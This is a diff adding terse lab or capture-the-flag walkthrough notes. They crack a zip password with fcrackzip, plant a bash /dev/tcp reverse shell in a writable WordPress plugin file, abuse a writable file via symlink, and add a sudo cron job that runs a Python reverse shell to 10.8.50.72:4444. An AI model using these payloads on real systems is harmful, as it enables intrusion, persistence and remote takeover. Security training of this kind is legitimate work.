@@ -1,0 +1,23 @@
+1.  found a zip file , zip2john cant do it so used fcrackzip
+
+`fcrackzip -v -u -D -p ~/Desktop/rockyou.txt backup.zip`
+
+2.  dolly.php was writable .. so first deactivate it then upload the shell like exec  and then activate ..automatic nc will connect
+
+`exec("/bin/bash -c 'bash -i > /dev/tcp/[your IP]/[PORT] 0>&1'");`
+
+3.  checking with strace the file msg.txt was read everytime options 2 was selected
+
+it was writable so make a symlink
+
+4)sudo crontab was there
+
+`sudo crontab -e`
+
+```
+* * * * * /usr/bin/sudo /usr/bin/python /tmp/shell.py
+
+or 
+put in vi
+* * * * * python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
